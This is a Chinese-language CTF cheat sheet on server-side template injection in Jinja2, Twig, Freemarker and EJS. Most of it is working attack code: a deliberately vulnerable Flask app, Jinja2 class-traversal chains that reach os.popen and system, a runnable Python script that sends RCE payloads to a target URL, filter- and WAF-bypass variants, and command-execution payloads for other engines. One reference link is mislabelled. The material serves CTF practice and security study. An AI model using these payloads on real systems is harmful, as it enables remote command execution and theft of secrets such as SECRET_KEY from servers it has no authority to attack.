---
title: SSTI 模板注入（Jinja2 / Twig / Freemarker）
category: web
tags: [ssti, 模板注入, jinja2, twig, freemarker]
signals: [输入被渲染到页面模板, 提交 7*7 回显 49, 模板引擎报错, 用户名欢迎语, 报告生成, 模板渲染功能, 模板注入]
difficulty: medium
source: "PortSwigger / PayloadsAllTheThings / HackTricks"
tools: [tplmap, burpsuite, python]
updated: 2026-10-22
---

## 一、识别信号（题面长什么样）

- 用户输入（昵称、站点名、邮件模板）进入了页面渲染。
- 提交 `{{7*7}}` 回显 `49`；提交 `<%= 7*7 %>` 回显 `49`（Ruby EJS）；`${7*7}` 回显 `49`（Freemarker/EL）。
- 报错页出现 `jinja2.exceptions`、`TemplateSyntaxError`、`freemarker.template`、`Twig\Error`。
- 存在"自定义模板"、"通知模板"、"PDF 导出"功能。
- 关键词：template、render、{{ }}、模板、注入。

## 二、原理

服务端把用户输入**作为模板源码**渲染：`render_template_string(user_input)`，而不是 `render_template_string("Hello " + user_input)`。于是 `{{ }}` 里的表达式会被模板引擎求值 —— 同等于代码执行。

常见引擎判别矩阵：

| Payload | 结果 | 引擎 |
|---|---|---|
| `{{7*7}}` | 49 | Jinja2 / Twig |
| `{{7*'7'}}` | `7777777` | Jinja2 |
| `{{7*'7'}}` | `49` | Twig |
| `${7*7}` | 49 | Freemarker / JSP EL |
| `<%= 7*7 %>` | 49 | Ruby ERB / EJS |
| `#{7*7}` | 49 | Ruby |
| `@(7*7)` | 49 | Razor |

## 三、解题步骤

1. **探测**：`{{7*7}}`、`${7*7}`、`#{7*7}`、`<%= 7*7 %>` 全试一遍，看谁回显 49。
2. **判别**：`{{7*'7'}}` 为 `7777777` → Jinja2；为 `49` → Twig。
3. **Jinja2 读文件**：`{{ config }}` 看配置，`{{ ''.__class__.__mro__[1].__subclasses__() }}` 找 `os._wrap_close` 或 `subprocess.Popen`。
4. **Twig**：`{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`（Twig 1.x）。
5. **Freemarker**：`<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }`。
6. 直接 `cat /flag`。

## 四、可直接运行的脚本

漏洞代码（用于本地复现 / 理解）：

```python
# app.py —— 故意漏洞版
from flask import Flask, request
from flask import render_template_string
app = Flask(__name__)

@app.route("/")
def index():
    name = request.args.get("name", "guest")
    return render_template_string("Hello " + name)     # ← 漏洞点

if __name__ == "__main__":
    app.run(port=5000)
```

Jinja2 利用链（逐级）：

```python
{{7*7}}                                   # 49 确认注入
{{config}}                                # 读取配置，可能有 SECRET_KEY
{{config.items()}}
{{''.__class__}}
{{''.__class__.__mro__}}                  # (<class 'str'>, <class 'object'>)
{{''.__class__.__mro__[1].__subclasses__()}}
# 在子类中找 os._wrap_close（下标因环境而异，脚本里搜）
{{''.__class__.__mro__[1].__subclasses__()[N].__init__.__globals__['system']('id')}}
# 常见替代：
{{lipsum.__globals__['os'].popen('cat /flag').read()}}
{{cycler.__init__.__globals__.os.popen('ls /').read()}}
{{().__class__.__bases__[0].__subclasses__()[N]}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{[].__class__.__base__.__subclasses__()}}
```

自动找下标并执行（本地把 Jinja2 当模块用，不依赖远端）：

```python
import re, requests

URL = "http://TARGET/?name="

def rce(cmd):
    # 1. 找 os._wrap_close 下标
    payload = "{{''.__class__.__mro__[1].__subclasses__()}}"
    r = requests.get(URL, params={"name": payload})
    m = re.search(r"<class 'os\._wrap_close'>", r.text)
    # 实际应解析列表拿到下标；这里给一个可工作的一行式：
    p = ("{{lipsum.__globals__['os'].popen('%s').read()}}" % cmd)
    return requests.get(URL, params={"name": p}).text

def find_index():
    r = requests.get(URL, params={"name": "{{''.__class__.__mro__[1].__subclasses__()}}"})
    for i, name in enumerate(re.findall(r"<class '([^']+)'>", r.text)):
        if name in ("os._wrap_close", "subprocess.Popen", "_frozen_importlib.BuiltinImporter"):
            return i, name
    return None

print(rce("id"))
print("下标:", find_index())
```

绕过过滤的 Jinja2 变体：

```text
# 过滤了 _ 或 . 用 attr / 拼接
{{''['__class__']}}   ->   {{''['\x5f\x5fclass\x5f\x5f']}}
{{''|attr('__class__')}}
{{''|attr(request.args.x1)|attr(request.args.x2)}}?x1=__class__&x2=__mro__

# 过滤了 [] 
{{''.__class__.__mro__.__getitem__(1).__subclasses__()}}

# 过滤了 {{ }}
{% for x in lipsum.__globals__.os.popen('id').read() %}{{ x }}{% endfor %}

# 过滤了 os / popen
{{lipsum.__globals__['__builtins__']['__import__']('subprocess').check_output('id')}}
```

Twig / Freemarker：

```text
# Twig 1.x
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}
{{['id']|filter('system')}}
{{["id"]|map("system")}}

# Freemarker（Java）
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
```

## 五、常见坑 / 变体

- **沙箱（SandboxedEnvironment）**：Flask 默认不沙箱；Jinja2 若开启 `SandboxedEnvironment`，`lipsum` 等仍可能可用，但 `__globals__` 会被封，找 `request.environ`。
- **`{{7*7}}` 回显 49 但 RCE 失败**：可能是 Twig 而不是 Jinja2（`{{7*'7'}}` 判别）。
- **下标的稳定性**：`__subclasses__()` 的下标随 Python 版本与已加载模块变化，脚本必须**动态搜索**，别写死。
- **URL 编码**：`{{` `}}` 在某些 WAF 里被拦，用 `{%print(7*7)%}` 或 `{{7*7}}` 的 HTML 实体 `&#123;&#123;7*7&#125;&#125;`。
- 变体：**Python 沙箱逃逸（pyjail）**与 SSTI 常同题出现，见 `python-pickle-pyjail.md`。
- 变体：**模板注入读取私有变量**：`{{ config }}`、`{{ request.environ }}`、`{{ get_flashed_messages.__globals__ }}`。
- 变体：**Node.js 的 `ejs`**：`<%= global.process.mainModule.require('child_process').execSync('id') %>`。

## 六、参考来源

- [PortSwigger Web Security Academy - Server-side template injection](https://portswigger.net/web-security/server-side-template-injection)
- [PayloadsAllTheThings - Server Side Template Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [HackTricks - SSTI (Server Side Template Injection)](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html)
- [onsecurity - SSTI with Jinja2](https://portswigger.net/web-security/server-side-template-injection)
- [Tplmap（自动化 SSTI 工具）](https://github.com/epinna/tplmap)
